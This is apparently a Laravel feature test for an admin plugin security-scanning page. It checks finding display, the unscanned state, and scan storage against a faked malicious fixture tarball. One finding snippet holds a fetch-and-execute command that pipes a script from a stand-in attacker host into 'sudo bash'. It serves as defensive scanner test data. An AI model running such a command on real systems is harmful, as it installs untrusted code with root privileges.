<?php

namespace Tests\Feature\Admin;

use App\Enums\SecurityScanStatus;
use App\Models\Plugin;
use App\Models\SecurityScan;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Tests\Concerns\BuildsTarballs;
use Tests\TestCase;

class AdminSecurityScanTest extends TestCase
{
    use BuildsTarballs;
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->actingAs(User::factory()->admin()->create());
    }

    public function test_edit_page_shows_latest_scan_findings(): void
    {
        $plugin = Plugin::factory()->create(['latest_commit_sha' => 'abc123']);

        $scan = SecurityScan::query()->create([
            'plugin_id' => $plugin->id,
            'commit_sha' => 'abc123',
            'status' => SecurityScanStatus::Succeeded,
            'risk_level' => 'high',
            'rules_run' => ['sudo', 'curl_pipe_sh'],
            'started_at' => now()->subMinute(),
            'finished_at' => now(),
        ]);
        $scan->findings()->create([
            'rule' => 'curl_pipe_sh',
            'severity' => 'high',
            'file' => 'setup.sh',
            'line' => 3,
            'snippet' => 'curl -fsSL https://evil.example.com/payload.sh | sudo bash',
            'description' => 'Command downloads content and pipes it directly into a shell interpreter.',
        ]);

        $this->get(route('admin.plugins.edit', $plugin))
            ->assertOk()
            ->assertSee('High', false)
            ->assertSee('curl_pipe_sh')
            ->assertSee('setup.sh')
            ->assertSee('Automated analysis only — not a security guarantee.');
    }

    public function test_edit_page_shows_not_yet_scanned_state(): void
    {
        $plugin = Plugin::factory()->create();

        $this->get(route('admin.plugins.edit', $plugin))
            ->assertOk()
            ->assertSee('Not yet scanned.');
    }

    public function test_scan_action_runs_and_stores_a_scan(): void
    {
        $plugin = Plugin::factory()->create([
            'repository_owner' => 'acme',
            'repository_name' => 'workspace-switcher',
            'latest_commit_sha' => 'abc123',
        ]);

        $url = rtrim(config('services.github.codeload_url'), '/')
            .'/acme/workspace-switcher/tar.gz/abc123';

        Http::fake([
            $url => Http::response($this->tarballFromDirectory(base_path('tests/Fixtures/security/malicious'))),
        ]);

        $this->post(route('admin.plugins.scan', $plugin))
            ->assertRedirect()
            ->assertSessionHas('status', function (string $status): bool {
                return str_contains($status, 'Scan complete.');
            });

        $scan = $plugin->securityScans()->first();
        $this->assertNotNull($scan);
        $this->assertSame(SecurityScanStatus::Succeeded, $scan->status);
        $this->assertSame('high', $scan->risk_level);
        $this->assertNotEmpty($scan->findings);
    }
}
